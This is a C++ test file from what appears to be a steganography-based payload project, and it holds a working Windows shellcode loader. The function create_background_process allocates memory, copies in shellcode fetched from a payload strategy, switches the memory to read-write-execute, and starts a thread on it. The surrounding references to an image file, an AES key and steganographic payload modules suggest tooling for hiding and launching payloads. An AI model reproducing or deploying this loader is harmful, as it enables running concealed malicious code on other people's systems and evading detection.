#include "background_process_test.h"
#include "extract_decrypt_test.h"
#include "core/steg/payload/payload_strategy.h"
#include "utils/file_logger.h"
#include <memory>
#include <windows.h>

namespace test {

HANDLE create_background_process(const std::vector<uint8_t>& shellcode) {
    utils::FileLogger::log("[BackgroundTest] Allocating memory for shellcode...");
    
    // Allocate memory
    LPVOID baseAddress = VirtualAlloc(nullptr, shellcode.size(), 
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!baseAddress) {
        utils::FileLogger::log("[BackgroundTest] Failed to allocate memory");
        return NULL;
    }

    char logMsg[256];
    snprintf(logMsg, sizeof(logMsg), "[BackgroundTest] Memory allocated at: %p", baseAddress);
    utils::FileLogger::log(logMsg);

    // Write shellcode
    memcpy(baseAddress, shellcode.data(), shellcode.size());

    // Verify shellcode copy
    if (memcmp(baseAddress, shellcode.data(), shellcode.size()) != 0) {
        utils::FileLogger::log("[BackgroundTest] Shellcode verification failed");
        VirtualFree(baseAddress, 0, MEM_RELEASE);
        return NULL;
    }
    utils::FileLogger::log("[BackgroundTest] Shellcode copied successfully");

    // Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(baseAddress, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        utils::FileLogger::log("[BackgroundTest] Failed to change memory protection");
        VirtualFree(baseAddress, 0, MEM_RELEASE);
        return NULL;
    }
    utils::FileLogger::log("[BackgroundTest] Memory protection changed to RWX");

    // Create thread
    utils::FileLogger::log("[BackgroundTest] Creating thread...");
    HANDLE thread = CreateThread(nullptr, 0, 
                               reinterpret_cast<LPTHREAD_START_ROUTINE>(baseAddress),
                               nullptr, 0, nullptr);
    if (!thread) {
        utils::FileLogger::log("[BackgroundTest] Failed to create thread");
        VirtualFree(baseAddress, 0, MEM_RELEASE);
        return NULL;
    }

    utils::FileLogger::log("[BackgroundTest] Thread created successfully");
    return thread;
}

bool test_background_process(const std::string& image_path, const std::string& key_path) {
    try {
        utils::FileLogger::log("[BackgroundTest] Starting background process test...");
        utils::FileLogger::log("[BackgroundTest] Using image: " + image_path);
        utils::FileLogger::log("[BackgroundTest] Using key: " + key_path);
        
        // Get test shellcode
        paylo::PlainTextPayloadStrategy payload_strategy;
        std::vector<uint8_t> shellcode = payload_strategy.getPayload();
        
        char logMsg[256];
        snprintf(logMsg, sizeof(logMsg), "[BackgroundTest] Shellcode size: %zu bytes", shellcode.size());
        utils::FileLogger::log(logMsg);
        
        // Create background process
        HANDLE thread = create_background_process(shellcode);
        if (!thread) {
            utils::FileLogger::log("[BackgroundTest] Failed to create background process");
            return false;
        }

        // Wait for thread to start
        utils::FileLogger::log("[BackgroundTest] Waiting for thread to start...");
        WaitForSingleObject(thread, 1000);  // Wait up to 1 second

        // Get thread exit code
        DWORD exitCode;
        if (GetExitCodeThread(thread, &exitCode)) {
            snprintf(logMsg, sizeof(logMsg), "[BackgroundTest] Thread exit code: %lu", exitCode);
            utils::FileLogger::log(logMsg);
        }

        CloseHandle(thread);
        utils::FileLogger::log("[BackgroundTest] Background process test completed");
        return true;
    }
    catch (const std::exception& e) {
        utils::FileLogger::log("[BackgroundTest] Test failed: " + std::string(e.what()));
        return false;
    }
}

void run_background_process_test() {
    utils::FileLogger::log("====== STARTING BACKGROUND PROCESS TESTS ======");
    
    const std::string image_path = "assets/images/lena3.bmp";
    const std::string key_path = "assets/bins/aes_data.bin";
    
    if (!test_background_process(image_path, key_path)) {
        utils::FileLogger::log("[BackgroundTest] Background process test failed");
        utils::FileLogger::log("====== TEST SUITE FAILED ======");
        return;
    }
    
    utils::FileLogger::log("[BackgroundTest] Background process test passed");
    utils::FileLogger::log("====== TEST SUITE PASSED ======");
}

} // namespace test